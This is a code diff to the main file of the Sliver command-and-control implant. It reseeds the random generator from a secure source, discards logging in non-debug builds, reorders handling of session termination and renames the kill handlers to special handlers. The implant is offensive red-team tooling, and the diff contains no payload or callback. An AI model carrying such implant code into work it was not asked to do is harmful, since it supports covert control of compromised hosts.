@@ -25,8 +25,10 @@ import "C"
 // {{end}}
 
 import (
+	"crypto/rand"
+	"encoding/binary"
 	"errors"
-
+	"log"
 	insecureRand "math/rand"
 	"os"
 	"os/user"
@@ -37,8 +39,8 @@ import (
 	"sync"
 	// {{end}}
 
-	// {{if .Config.Debug}}
-	"log"
+	// {{if .Config.Debug}}{{else}}
+	"io/ioutil"
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
@@ -67,6 +69,13 @@ var (
 )
 
 func init() {
+	buf := make([]byte, 8)
+	n, err := rand.Read(buf)
+	if err != nil || n != len(buf) {
+		insecureRand.Seed(time.Now().Unix())
+	} else {
+		insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf)))
+	}
 	id, err := uuid.NewV4()
 	if err != nil {
 		buf := make([]byte, 16) // NewV4 fails if secure rand fails
@@ -164,6 +173,8 @@ func main() {
 		}
 	}
 	// {{else}}
+	log.SetFlags(0)
+	log.SetOutput(ioutil.Discard)
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -230,11 +241,11 @@ func sessionStartup() {
 	for connection := range connections {
 		if connection != nil {
 			err := sessionMainLoop(connection)
+			if err == ErrTerminate {
+				connection.Cleanup()
+				return
+			}
 			if err != nil {
-				if err == ErrTerminate {
-					connection.Cleanup()
-					return
-				}
 				connectionErrors++
 				if transports.GetMaxConnectionErrors() < connectionErrors {
 					return
@@ -438,7 +449,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
-	specHandlers := handlers.GetKillHandlers()
+	specHandlers := handlers.GetSpecialHandlers()
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
@@ -542,10 +553,6 @@ func openSessionHandler(data []byte) {
 			connectionAttempts++
 			if connection != nil {
 				err := sessionMainLoop(connection)
-				if err == ErrTerminate {
-					connection.Cleanup()
-					return
-				}
 				if err == nil {
 					break
 				}
@@ -594,12 +601,13 @@ func sessionMainLoop(connection *transports.Connection) error {
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
-	specialHandlers := handlers.GetKillHandlers()
+	specialHandlers := handlers.GetSpecialHandlers()
 	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
-		envelope := envelope
 		if _, ok := specialHandlers[envelope.Type]; ok {
+			// Special handler at this point is just the exit handler.
+			// We can safely return here, and let the caller know thart we want to terminate.
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
